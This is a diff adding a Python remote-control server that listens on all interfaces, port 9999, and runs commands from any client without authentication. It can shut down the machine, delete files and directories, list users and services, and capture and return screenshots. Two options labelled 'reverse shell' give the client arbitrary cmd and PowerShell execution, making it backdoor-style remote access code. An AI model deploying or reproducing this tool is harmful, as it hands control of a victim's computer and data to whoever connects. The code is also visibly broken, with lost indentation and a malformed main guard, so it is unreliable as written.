@@ -1,0 +1,190 @@
+import socket
+import subprocess
+import os
+import shutil
+import pyautogui
+import webbrowser
+import ctypes
+import psutil
+
+
+def execute_command(command):
+try:
+if command == "1":  # Shutdown
+subprocess.run(["shutdown", "/s", "/f", "/t", "0"], check=True)
+return "Shutdown initiated."
+
+
+    elif command == "2":  # Restart
+        subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=True)
+        return "Restart initiated."
+    
+    elif command == "3":  # Log Off
+        subprocess.run(["shutdown", "/l"], check=True)
+        return "Log off initiated."
+    
+    elif command == "4":  # Sleep Mode
+        subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"], check=True)
+        return "System going to sleep."
+    
+    elif command == "5":  # Lock Workstation
+        subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], check=True)
+        return "System locked."
+    
+    elif command == "6":  # Turn Off Display
+        subprocess.run("nircmd.exe monitor off", check=True)
+        return "Monitor turned off."
+    
+    elif command == "7":  # System Info
+        result = subprocess.run(["systeminfo"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "8":  # Disk Usage
+        result = subprocess.run(["wmic", "logicaldisk", "get", "size,freespace,caption"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "9":  # List Running Processes
+        result = subprocess.run(["tasklist"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "10":  # IP Configuration
+        result = subprocess.run(["ipconfig"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "11":  # Ping Test
+        result = subprocess.run(["ping", "8.8.8.8"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "12":  # Internet Speed
+        result = subprocess.run(["speedtest-cli"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "13":  # List Files in Directory
+        result = subprocess.run(["dir", "C:\\"], capture_output=True, text=True, shell=True)
+        return result.stdout
+    
+    elif command == "14":  # Create a File
+        file_path = "C:\\Users\\Public\\testfile.txt"
+        with open(file_path, "w") as file:
+            file.write("Created remotely via Python.")
+        return f"File created at {file_path}."
+    
+    elif command == "15":  # Delete a File
+        file_path = "C:\\Users\\Public\\testfile.txt"
+        os.remove(file_path)
+        return f"File {file_path} deleted."
+    
+    elif command == "16":  # Copy File
+        shutil.copy("C:\\Users\\Public\\testfile.txt", "C:\\Users\\Public\\testfile_copy.txt")
+        return "File copied."
+    
+    elif command == "17":  # Move File
+        shutil.move("C:\\Users\\Public\\testfile_copy.txt", "C:\\Users\\Public\\testfile_moved.txt")
+        return "File moved."
+    
+    elif command == "18":  # Delete Directory
+        shutil.rmtree("C:\\Users\\Public\\testfolder")
+        return "Directory deleted."
+    
+    elif command == "19":  # CPU Usage
+        cpu_usage = psutil.cpu_percent(interval=1)
+        return f"Current CPU usage: {cpu_usage}%"
+    
+    elif command == "20":  # Memory Usage
+        memory = psutil.virtual_memory()
+        return f"Memory usage: {memory.percent}% used"
+    
+    elif command == "21":  # Battery Status (if applicable)
+        battery = psutil.sensors_battery()
+        return f"Battery percent: {battery.percent}%"
+    
+    elif command == "22":  # Open Website
+        webbrowser.open("https://www.example.com")
+        return "Opening website."
+    
+    elif command == "23":  # Take a Screenshot
+        screenshot = pyautogui.screenshot()
+        screenshot.save("screenshot.png")
+        return "Screenshot taken and saved."
+    
+    elif command == "24":  # Display Message on Screen
+        ctypes.windll.user32.MessageBoxW(0, "This is a remote message!", "Message", 0x40 | 0x1)
+        return "Message displayed."
+    
+    elif command == "25":  # List Users
+        result = subprocess.run(["net", "user"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "26":  # List Services
+        result = subprocess.run(["sc", "query"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "27":  # Firewall Status
+        result = subprocess.run(["netsh", "advfirewall", "show", "currentprofile"], capture_output=True, text=True)
+        return result.stdout
+    
+    elif command == "28":  # Reverse Shell (CMD)
+        return "Reverse Shell (CMD) initiated."
+    
+    elif command == "29":  # Reverse Shell (PowerShell)
+        return "Reverse Shell (PowerShell) initiated."
+    
+    else:
+        return "Unknown command."
+except Exception as e:
+    return f"Error executing command: {e}"
+
+def start_server(host='0.0.0.0', port=9999):
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind((host, port))
+server_socket.listen(1)
+print(f"Listening for incoming connections on {host}:{port}")
+
+
+while True:
+    client_socket, client_address = server_socket.accept()
+    print(f"Connection from {client_address}")
+    
+    while True:
+        try:
+            command = client_socket.recv(1024).decode('utf-8').strip()
+            if not command:
+                break
+            
+            print(f"Received command: {command}")
+            
+            if command == "23":
+                execute_command(command)
+                with open("screenshot.png", "rb") as file:
+                    screenshot_data = file.read()
+                client_socket.sendall(screenshot_data)
+            
+            elif command == "28":
+                while True:
+                    cmd_command = client_socket.recv(1024).decode('utf-8').strip()
+                    if cmd_command.lower() == "exit":
+                        break
+                    
+                    result = subprocess.run(cmd_command, shell=True, capture_output=True, text=True)
+                    client_socket.sendall(result.stdout.encode('utf-8'))
+            
+            elif command == "29":
+                while True:
+                    ps_command = client_socket.recv(1024).decode('utf-8').strip()
+                    if ps_command.lower() == "exit":
+                        break
+                    
+                    result = subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
+                    client_socket.sendall(result.stdout.encode('utf-8'))
+            
+            else:
+                result = execute_command(command)
+                client_socket.sendall(result.encode('utf-8'))
+        
+        except Exception as e:
+            client_socket.sendall(f"Error: {str(e)}".encode('utf-8'))
+    
+    client_socket.close()
+
+if name == "main":
+start_server()
